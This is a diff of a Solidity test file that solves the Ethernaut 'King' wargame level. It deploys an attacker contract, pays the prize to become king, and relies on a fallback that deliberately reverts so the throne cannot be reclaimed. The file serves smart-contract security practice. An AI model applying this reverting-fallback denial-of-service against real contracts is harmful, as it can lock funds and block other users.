@@ -30,14 +30,20 @@ contract KingTest is DSTest {
         ethernaut.registerLevel(kingFactory);
         // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called
         vm.startPrank(attacker);
-        address levelAddress = ethernaut.createLevelInstance(kingFactory);
+        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(kingFactory);
         King ethernautKing = King(payable(levelAddress));
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
- 
+        KingHack kingHack = new KingHack(payable(levelAddress));
 
+        uint prize = ethernautKing.prize();
+
+        // Become king
+        kingHack.attack{value: prize}();
+
+        // kingHack has malicious fallback that fails when you try to send it eth
 
         //////////////////////
         // LEVEL SUBMISSION //
@@ -45,6 +51,6 @@ contract KingTest is DSTest {
 
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
-        // assert(levelSuccessfullyPassed);
+        assert(levelSuccessfullyPassed);
     }
 }
